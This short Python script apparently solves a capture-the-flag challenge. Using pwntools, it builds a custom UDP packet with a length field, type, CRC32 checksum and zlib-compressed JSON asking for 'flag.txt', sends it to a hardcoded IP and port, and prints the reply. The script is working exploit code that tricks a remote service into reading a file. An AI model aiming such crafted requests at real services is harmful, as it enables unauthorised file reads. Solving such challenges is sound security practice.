from pwn import *
import zlib

origin = b'{"action":"read", "file":"flag.txt"}'
length = p16(len(origin))
dat = zlib.compress(origin)
checksum = p32(zlib.crc32(dat))
ctype = p16(0x1)


packet = length+ctype+checksum+dat

io = remote('178.128.19.56', 3109, typ="udp")
io.send(packet)
print(io.recv())
